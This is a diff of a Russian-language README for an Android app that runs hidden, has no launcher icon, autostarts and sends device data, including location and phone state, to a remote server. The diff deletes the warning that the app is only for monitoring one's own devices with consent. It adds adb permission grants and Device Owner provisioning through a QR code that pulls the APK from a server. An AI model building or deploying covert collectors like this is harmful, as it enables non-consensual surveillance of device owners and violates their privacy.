@@ -1,9 +1,6 @@
 # AndroidDataCollector
 
 Скрытое Android-приложение для автоматического сбора информации об устройстве и отправки её на удалённый сервер. Работает в фоне, не имеет иконки в лаунчере, автоматически запускается после перезагрузки устройства.
-
-> **Предупреждение:** Проект предназначен исключительно для образовательных целей и мониторинга собственных устройств. Использование приложения для слежки за чужими устройствами без согласия владельца является незаконным.
-
 ---
 
 ## Содержание
@@ -285,7 +282,7 @@ val workRequest = PeriodicWorkRequestBuilder<DataCollectionWorker>(
 )
 ```
 
-> **Важно:** WorkManager имеет минимальный интервал **15 минут**. Если нужен более частый запуск (например, 20 секунд), используйте `DataCollectionService` вместо WorkManager.
+> **Важно:** WorkManager имеет минимальный интервал **15 минут**. Если нужен более частый запуск (например, 20 секунд), не используйте WorkManager.
 
 ### Задержка первого запуска
 
@@ -367,15 +364,15 @@ adb shell dumpsys connectivity | grep -A 5 "Active networks"
 ./gradlew installDebug
 
 # Дать разрешение
-adb shell pm grant com.gps.gpsdatacollector android.permission.ACCESS_FINE_LOCATION
-adb shell pm grant com.gps.gpsdatacollector android.permission.ACCESS_COARSE_LOCATION
+adb shell pm grant com.extreme.androiddatacollector android.permission.ACCESS_FINE_LOCATION
+adb shell pm grant com.extreme.androiddatacollector android.permission.ACCESS_COARSE_LOCATION
+adb shell pm grant com.extreme.androiddatacollector android.permission.READ_PHONE_STATE
 
 # Посмотреть логи
 adb logcat -s DataCollectionService:D DataSender:D DataCollector:D
 
 # Принудительный запуск службы через ADB:
-adb shell am startservice -a ACTION_START -n com.extreme.androiddatacollector/.DataCollectionService
-adb shell am start-foreground-service -a ACTION_START -n com.extreme.androiddatacollector/.DataCollectionService
+adb shell am start -n com.extreme.androiddatacollector/.MainActivity
 
 # Назначить права Device Owner
 adb shell dpm set-device-owner com.extreme.androiddatacollector/.MyDeviceAdminReceiver
@@ -385,6 +382,9 @@ adb shell dumpsys device_policy | findstr com.extreme.androiddatacollector
 
 # Снять права Device Owner
 adb shell dpm remove-active-admin com.extreme.androiddatacollector/.MyDeviceAdminReceiver
+
+# Удалить приложение
+adb shell pm uninstall --user all com.extreme.androiddatacollector  
 ```
 
 # Release Версия
@@ -407,6 +407,19 @@ adb shell dpm remove-active-admin com.extreme.androiddatacollector/.MyDeviceAdmi
 ```
 ./gradlew printReleaseCertSha256
 ```
+
+# Провижининг Device Owner
+Вшить в QR-код:
+```
+{
+"android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_NAME": "com.extreme.androiddatacollector",
+"android.app.extra.PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM": "elxhMR8fX6z4AA6xo8L21mJKRTsWSCgVg1c1KPmarZw=",
+"android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": "http://10.168.143.7:8100/download/adc_apk",
+"android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": true
+}
+```
+PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM - SHA256 (Base64)
+
 
 ### Типичные проблемы
 
